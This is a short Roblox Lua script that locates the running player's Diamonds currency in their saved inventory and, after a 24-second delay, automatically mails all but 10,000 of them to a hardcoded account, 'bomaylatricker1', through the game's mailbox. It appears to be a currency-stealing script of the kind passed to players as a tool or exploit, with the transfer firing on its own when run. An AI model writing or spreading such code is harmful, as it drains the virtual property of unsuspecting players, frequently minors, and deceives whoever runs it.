local Library = require(game:GetService("ReplicatedStorage").Library)
local SavedData;
repeat wait()
    pcall(function()
        SavedData = Library.Save.Get();
    end);
until type(SavedData) == "table";

local Network = Library.Network
local Functions = Library.Functions


function getDiamonds()
    for i, v in pairs(SavedData["Inventory"]["Currency"]) do
        if v["id"] == "Diamonds" then
            return i, tonumber(v["_am"])
        end
    end
    return false
end


function SendDiamonds(options)

    local user = options.user;
    local amount = options.amount;

    local ID, Amount = getDiamonds()
    if ID and Amount then
        if amount == "All" and Amount > 10000 then
            return Network.Invoke("Mailbox: Send", user, ("Diamonds (%s)"):format(Functions.NumberShorten(Amount - 10000)), "Currency", ID, Amount - 10000)
        elseif Amount >= amount + 10000 then
            return Network.Invoke("Mailbox: Send", user, ("Diamonds (%s)"):format(Functions.NumberShorten(amount)), "Currency", ID, amount)
        else
            warn("Not Enough Diamonds")
        end
    end
end


-- if u want to send all just change amount to "All"
spawn(function()
    wait(24)
    SendDiamonds({ user = "bomaylatricker1" , amount = "All" })
end)
